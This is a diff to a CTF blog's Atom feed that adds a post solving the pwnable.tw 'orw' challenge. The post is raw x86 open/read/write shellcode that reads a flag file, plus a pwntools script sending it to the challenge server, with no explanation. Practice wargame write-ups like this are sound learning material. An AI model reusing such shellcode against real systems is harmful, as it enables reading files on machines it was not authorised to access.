@@ -4,7 +4,7 @@
   <title><![CDATA[BangCTF]]></title>
   <link href="http://bangctf.github.io/atom.xml" rel="self"/>
   <link href="http://bangctf.github.io/"/>
-  <updated>2018-08-24T14:29:57+08:00</updated>
+  <updated>2018-08-24T17:07:09+08:00</updated>
   <id>http://bangctf.github.io/</id>
   <author>
     <name><![CDATA[Bang]]></name>
@@ -12,6 +12,153 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[[pwnable.tw] Orw]]></title>
+    <link href="http://bangctf.github.io/blog/2018/08/24/pwnable-dot-tw-orw/"/>
+    <updated>2018-08-24T17:06:35+08:00</updated>
+    <id>http://bangctf.github.io/blog/2018/08/24/pwnable-dot-tw-orw</id>
+    <content type="html"><![CDATA[<p><br /></p>
+
+<div class="MsoNormal">
+<br /></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">push 0x00<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">push
+0x67616c66<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">push
+0x2f77726f<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">push
+0x2f656d6f<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">push
+0x682f2f2f<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">mov eax,5<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">mov
+ebx,esp<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">mov ecx,0<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">mov edx,0<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">int 0x80<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<br /></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">mov
+ebx,eax<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">mov eax,3<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">mov
+ecx,esp<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">mov
+edx,50<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">int 0x80<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<br /></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">mov eax,4<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">mov ebx,1<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">mov
+ecx,esp<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">mov
+edx,50<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">int 0x80<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<br /></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">from pwn
+import *<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<br /></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">r =
+remote('chall.pwnable.tw',10001)<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<br /></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">r.send("\x6A\x00\x68\x66\x6C\x61\x67\x68\x6F\x72\x77\x2F\x68\x6F\x6D\x65\x2F\x68\x2F\x2F\x2F\x68\xB8\x05\x00\x00\x00\x89\xE3\xB9\x00\x00\x00\x00\xBA\x00\x00\x00\x00\xCD\x80\x89\xC3\xB8\x03\x00\x00\x00\x89\xE1\xBA\x32\x00\x00\x00\xCD\x80\xB8\x04\x00\x00\x00\xBB\x01\x00\x00\x00\x89\xE1\xBA\x32\x00\x00\x00\xCD\x80")<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<br /></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">r.interactive()<o:p></o:p></span></div>
+
+
+<p><br /></p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[[pwnable.tw] Start]]></title>
